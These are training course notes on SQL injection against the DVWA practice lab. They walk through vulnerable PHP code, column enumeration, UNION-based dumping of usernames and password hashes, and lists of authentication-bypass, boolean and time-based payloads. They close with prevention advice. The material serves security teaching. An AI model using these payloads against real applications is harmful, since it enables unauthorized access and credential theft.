## Module 41: SQL Injection (SQLi)

### What is SQL Injection?

**Definition:** In an SQL Injection attack, the hacker tricks the website by adding their own commands into the data they send. So, the website unknowingly gives them access to sensitive data, and lets them change, delete, and even steal it.

**How It Works:**

- Attacker sends malicious SQL commands
- Website executes commands without validation
- Database returns sensitive information
- Attacker gains unauthorized access

**Real-World Analogy:**

```
Restaurant Scenario:
- Chef uses order list to prepare meals
- Normal order: "I'll have the chicken salad"
- Malicious order: "Give me access to all kitchen ingredients"
- Chef (trusting order list) follows it
- Attacker gets full kitchen access

Website Equivalent:
- Application uses user input in SQL queries
- Normal input: Username "admin"
- Malicious input: "admin' OR '1'='1"
- Database (trusting input) executes it
- Attacker dumps entire database
```

### Why SQL Injection Happens

**Root Causes:**

1. No input sanitization
2. No input validation
3. Direct user input in SQL queries
4. Trusting all incoming data
5. Poor error handling

**Vulnerable Pattern:**

```php
// DANGEROUS CODE
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);
```

**Problem:** User input directly inserted into query without checking!

---

## Module 42: SQL Injection Practical (DVWA)

### Initial Setup

**Navigate to:**

```
DVWA → SQL Injection
Security Level: Low
```

**Interface:** Shows "User ID" input field

### Understanding Normal Functionality

**Test Input:**

```
User ID: 1
Submit
```

**Result:**

```
ID: 1
First name: admin
Surname: admin
```

**Test Other IDs:**

```
User ID: 2 → Gordon Brown
User ID: 3 → Hack Me
User ID: 4 → Pablo Picasso
User ID: 5 → Bob Smith
```

**Analysis:** Application queries database based on User ID

### Behind the Scenes: SQL Query

**View Source Code:**

```php
<?php
$id = $_REQUEST['id'];

// SQL Query
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
?>
```

**SQL Query Breakdown:**

```sql
SELECT first_name, last_name     -- Select these columns
FROM users                        -- From users table
WHERE user_id = '2'              -- Where user_id equals 2
```

**What This Does:**

1. Takes first_name column
2. Takes last_name column
3. From the "users" table
4. Where user_id matches input (2)
5. Returns: Gordon Brown

### Understanding Database Structure

**Database Concept:**

- **Database:** Storage for all data
- **Tables:** Organized data sections (users, passwords, posts)
- **Columns:** Data fields (first_name, last_name, email)
- **Rows:** Individual records

**Example Users Table:**

```
| user_id | first_name | last_name | email              |
|---------|------------|-----------|-------------------|
| 1       | admin      | admin     | admin@dvwa.com    |
| 2       | Gordon     | Brown     | gordon@dvwa.com   |
| 3       | Hack       | Me        | hack@dvwa.com     |
```

---

## Module 43: Exploiting SQL Injection (Low Security)

### Testing for Vulnerability

**Step 1: Break the Query**

**Input:**

```sql
1'
```

**What Happens:**

```sql
-- Original query
SELECT first_name, last_name FROM users WHERE user_id = '1'

-- After our input
SELECT first_name, last_name FROM users WHERE user_id = '1''
                                                          ↑ Extra quote breaks query
```

**Result:** Error message or unexpected behavior confirms vulnerability!

### Basic SQL Injection Payload

**Step 2: Inject Always-True Condition**

**Input:**

```sql
1' OR '1'='1
```

**Complete Query:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'
```

**Breakdown:**

```
WHERE user_id = '1'    -- First condition (may be false)
OR                     -- Logical OR operator
'1'='1'               -- Always true condition
```

**Result:** Returns ALL users from database!

**Output:**

```
ID: 1
First name: admin
Surname: admin

ID: 2
First name: Gordon
Surname: Brown

ID: 3
First name: Hack
Surname: Me

ID: 4
First name: Pablo
Surname: Picasso

ID: 5
First name: Bob
Surname: Smith
```

### Why This Works

**Logic Explanation:**

**Normal Query:**

```sql
WHERE user_id = '1'
Result: Only returns user with ID 1
```

**Injected Query:**

```sql
WHERE user_id = '1' OR '1'='1'
```

**Step-by-step:**

1. First part: `user_id = '1'` (checks for user 1)
2. `OR` operator: If EITHER condition is true, return result
3. Second part: `'1'='1'` (ALWAYS TRUE)
4. Since `'1'='1'` is always true, ALL users returned

**SQL Logic:**

```
FALSE OR TRUE  = TRUE
TRUE  OR TRUE  = TRUE
FALSE OR FALSE = FALSE

Since '1'='1' is ALWAYS TRUE:
ANY_CONDITION OR TRUE = ALWAYS TRUE
```

### Comment Syntax in SQL

**Purpose:** Ignore rest of query

**Input:**

```sql
1' OR '1'='1' --
```

**What `--` Does:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' -- '
                                                                        ↑ Everything after is ignored
```

**Result:** Cleaner execution, ignores trailing quote

---

## Module 44: Enumerating Database Structure

### Step 1: Find Number of Columns

**Why:** Need to know table structure for UNION attacks

**Technique: ORDER BY Clause**

**Test 1:**

```sql
1' ORDER BY 1 --
```

**Result:** No error (Column 1 exists ✓)

**Test 2:**

```sql
1' ORDER BY 2 --
```

**Result:** No error (Column 2 exists ✓)

**Test 3:**

```sql
1' ORDER BY 3 --
```

**Result:**

```
Unknown column '3' in 'order clause'
```

**Conclusion:** Table has exactly 2 columns

### Step 2: Extract Data with UNION

**What is UNION?**

- Combines results from multiple SELECT statements
- Must have same number of columns
- Allows selecting from different tables

**Basic UNION Syntax:**

```sql
SELECT column1, column2 FROM table1
UNION
SELECT column3, column4 FROM table2
```

### Dumping User Credentials

**Payload:**

```sql
1' UNION SELECT user, password FROM users --
```

**Complete Query:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION
SELECT user, password FROM users --
```

**What This Does:**

1. First SELECT: Gets first_name and last_name (normal data)
2. UNION: Combines with second SELECT
3. Second SELECT: Gets user and password columns
4. Result: All usernames and passwords displayed!

**Result:**

```
ID: 1
First name: admin
Surname: admin

ID: admin
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: gordonb
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 1337
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: pablo
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: smithy
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

**Success:** Dumped all usernames and password hashes! 🎯

---

## Module 45: SQL Injection Attack Methodology

### Complete Attack Workflow

```
1. Identify SQL interaction point
   ↓
2. Test for vulnerability (inject ')
   ↓
3. Confirm with boolean payload (' OR '1'='1)
   ↓
4. Enumerate columns (ORDER BY)
   ↓
5. Extract data (UNION SELECT)
   ↓
6. Dump sensitive information
```

### Testing Checklist

**Step 1: Find Database Interaction**

- Login forms
- Search boxes
- URL parameters (?id=1)
- POST data
- Cookies
- HTTP headers

**Step 2: Test for Errors**

```sql
'
"
1'
1"
' OR '1'='1
" OR "1"="1
```

**Step 3: Confirm Vulnerability**

```sql
' OR '1'='1' --
' OR 1=1 --
admin' --
```

**Step 4: Enumerate Structure**

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
... continue until error
```

**Step 5: Extract Data**

```sql
' UNION SELECT null, null --
' UNION SELECT user, password FROM users --
' UNION SELECT database(), version() --
```

### Common SQL Injection Payloads

**From PayloadsAllTheThings:**

**Authentication Bypass:**

```sql
admin' --
admin' #
admin'/*
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
') OR ('1'='1
') OR ('1'='1' --
```

**UNION-Based:**

```sql
' UNION SELECT null--
' UNION SELECT null, null--
' UNION SELECT 1,2,3--
' UNION SELECT user(), database(), version()--
```

**Boolean-Based:**

```sql
' AND '1'='1
' AND '1'='2
' AND 1=1--
' AND 1=2--
```

**Time-Based:**

```sql
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
' AND BENCHMARK(5000000,MD5('test'))--
```

---

## Module 46: SQL Injection - Medium Security

### Analyzing Medium Security

**Change Security Level:**

```
DVWA Security → Medium
Save
Navigate to: SQL Injection
```

**Interface Change:** Dropdown menu instead of text input!

**Options:**

```
1
2
3
4
5
```

**Testing:**

```
Select: 2
Submit
Result: Gordon Brown (normal functionality)
```

### Intercepting with Burp Suite

**Step 1: Enable Proxy**

```
FoxyProxy → Burp (Enabled)
Burp Suite → Intercept: ON
```

**Step 2: Submit Request**

```
Select: 2
Click: Submit
```

**Step 3: Analyze Intercepted Request**

```http
POST /vulnerabilities/sqli/ HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

id=2&Submit=Submit
```

**Key Finding:** POST request, not GET!

### Source Code Analysis

**View Source → Medium:**

```php
<?php
$id = $_POST['id'];
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
?>
```

**Security Measures:**

1. Uses POST instead of GET
2. `mysqli_real_escape_string()` escapes special characters
3. Adds escaping to quotes

**The Problem:**

```php
WHERE user_id = $id
              ↑ No quotes around $id!
```

### Why Quote Escaping Doesn't Help

**With Quotes (Escaped):**

```sql
WHERE user_id = '2\'  OR \'1\'=\'1'
                ↑ Escaping breaks the injection
```

**Without Quotes (No Escaping Needed):**

```sql
WHERE user_id = 2 OR 1=1
                ↑ No quotes to escape!
```

### Exploiting Medium Security

**Step 1: Send to Repeater**

```
Right-click intercepted request → Send to Repeater
```

**Step 2: Test Basic Payload**

**Original:**

```
id=2&Submit=Submit
```

**Modified:**

```
id=2 OR 1=1&Submit=Submit
```

**Send Request**

**Result:**

```html
First name: admin Surname: admin First name: Gordon Surname: Brown First name: Hack Surname: Me ...
```

**Success:** Dumped all users! ✓

### Enumerating Columns

**Payload 1:**

```
id=2 ORDER BY 1&Submit=Submit
```

**Result:** 200 OK (Column 1 exists)

**Payload 2:**

```
id=2 ORDER BY 2&Submit=Submit
```

**Result:** 200 OK (Column 2 exists)

**Payload 3:**

```
id=2 ORDER BY 3&Submit=Submit
```

**Result:** Error - Unknown column '3' in 'order clause'

**Conclusion:** 2 columns in table

### Dumping Passwords

**Payload:**

```
id=2 UNION SELECT user, password FROM users&Submit=Submit
```

**Result:**

```
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

...all users and password hashes dumped...
```

**Success:** Complete database dump achieved! 🎯

### Why Medium Security Failed

**The Vulnerability:**

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
                                                                    ↑ No quotes!
```

**Numeric Context:**

- No quotes around `$id`
- Escaping only affects quoted strings
- Numeric values don't need escaping
- Direct SQL injection still possible

**Secure Implementation Would Be:**

```php
// Use prepared statements
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

---

## Module 47: Understanding Payloads

### Payload Resources

**PayloadsAllTheThings Repository:**

```
URL: https://github.com/swisskyrepo/PayloadsAllTheThings
Navigate to: SQL Injection
```

**What You'll Find:**

- MySQL injection payloads
- PostgreSQL payloads
- MSSQL payloads
- Oracle payloads
- Authentication bypasses
- Error-based techniques
- Blind SQL injection methods

**Example Payloads:**

**Authentication Bypass:**

```sql
admin' --
admin' #
' OR '1'='1
' OR 1=1--
') OR ('1'='1
```

**UNION Attacks:**

```sql
' UNION SELECT null--
' UNION SELECT null, null--
' UNION SELECT user(), database()--
' UNION SELECT table_name FROM information_schema.tables--
```

**Boolean-Based:**

```sql
' AND '1'='1
' AND '1'='2
' AND SUBSTRING(database(),1,1)='a
```

### Using Payloads Effectively

**Process:**

1. Identify vulnerability
2. Find appropriate payload from PayloadsAllTheThings
3. Customize for target database
4. Test and refine
5. Extract data

**Important:** Not all payloads work on all databases - customize for target!

---

## Module 48: Blind SQL Injection Introduction

### What is Blind SQL Injection?

**Definition:** In blind SQL injection, the attacker doesn't get direct error messages and data back from the server. Instead, they send carefully crafted questions to the server, and by observing the server's behavior (like how long it takes to respond), they can figure out things like usernames, passwords, and even sensitive data.

**Key Difference:**

**Error-Based (What we learned):**

```
Input: ' OR '1'='1
Output: [All database records displayed]
        Clear error messages
        Direct data extraction
```

**Blind SQL Injection:**

```
Input: ' AND SLEEP(5)--
Output: [Page takes 5 seconds to load]
        No error messages
        No direct data
        Inference from behavior
```

### Real-World Analogy

**Restaurant Secret Recipe:**

**Error-Based SQLi:**

```
You: "Show me the recipe"
Chef: "Here's the full recipe!" [Direct answer]
```

**Blind SQLi:**

```
You: "Is the recipe from Italy?"
Chef: *nods head* [Yes]

You: "Does it contain tomatoes?"
Chef: *shakes head* [No]

You: "Does it have basil?"
Chef: *nods head* [Yes]

After many questions → You reconstruct entire recipe!
```

### Types of Blind SQL Injection

**1. Boolean-Based Blind SQLi:**

- Response changes based on TRUE/FALSE
- Different content for true vs false conditions
- Extract data bit by bit

**2. Time-Based Blind SQLi:**

- Response delayed for TRUE conditions
- Use SLEEP() or BENCHMARK()
- No visible content change
- Timing reveals information

---

## SQL Injection Summary

### Key Concepts

**What We Learned:**
✓ SQL Injection basics
✓ Error-based exploitation
✓ UNION-based attacks
✓ Column enumeration
✓ Data extraction
✓ POST vs GET injection
✓ Bypassing basic filters
✓ Blind SQLi introduction

### Attack Methodology

```
1. Identify input points
2. Test for SQL interaction
3. Check for errors (inject ')
4. Confirm vulnerability (' OR '1'='1)
5. Enumerate columns (ORDER BY)
6. Extract data (UNION SELECT)
7. Dump sensitive information
8. Crack password hashes
```

### Common Injection Points

| Location       | Example                  |
| -------------- | ------------------------ |
| URL parameters | `?id=1`                  |
| Login forms    | username/password fields |
| Search boxes   | search queries           |
| POST data      | form submissions         |
| Cookies        | session values           |
| HTTP headers   | User-Agent, Referer      |

### Security Levels Comparison

| Level      | Protection          | Bypass           |
| ---------- | ------------------- | ---------------- |
| **Low**    | None                | Direct injection |
| **Medium** | Basic escaping      | Numeric context  |
| **High**   | Prepared statements | Very difficult   |

### Prevention Best Practices

**For Developers:**

**1. Use Prepared Statements (Best)**

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

**2. Input Validation**

```php
if (!is_numeric($id)) {
    die('Invalid input');
}
```

**3. Escaping (Not Recommended Alone)**

```php
$id = mysqli_real_escape_string($conn, $id);
```

**4. Least Privilege**

```sql
-- Database user should have minimal permissions
GRANT SELECT ON database.table TO 'webapp'@'localhost';
-- Don't use root account!
```

**5. Error Handling**

```php
// Don't display detailed errors to users
ini_set('display_errors', 0);
// Log errors instead
error_log($error_message);
```

---

## Key Takeaways

### SQL Injection Impact

✓ Complete database access
✓ Steal all user credentials
✓ Modify/delete data
✓ Bypass authentication
✓ Critical severity vulnerability

### Essential Testing Steps

✓ Always test input fields
✓ Look for database interactions
✓ Use systematic enumeration
✓ Document all findings
✓ Test both GET and POST

### Important Payloads

✓ `' OR '1'='1` - Authentication bypass
✓ `' ORDER BY 1--` - Column enumeration
✓ `' UNION SELECT user,password FROM users--` - Data extraction
✓ `' AND SLEEP(5)--` - Time-based blind
✓ Reference PayloadsAllTheThings for more

---

**Course Status:** SQL Injection Basics Complete
**Next Up:**

- Blind SQL Injection (Detailed)
- Advanced SQL Injection Techniques
- XSS (Cross-Site Scripting)
- Additional DVWA Vulnerabilities

---

_This completes SQL Injection fundamentals. Practice extensively in safe environments before attempting real applications._# Ultimate Bug Bounty Course - Part 5
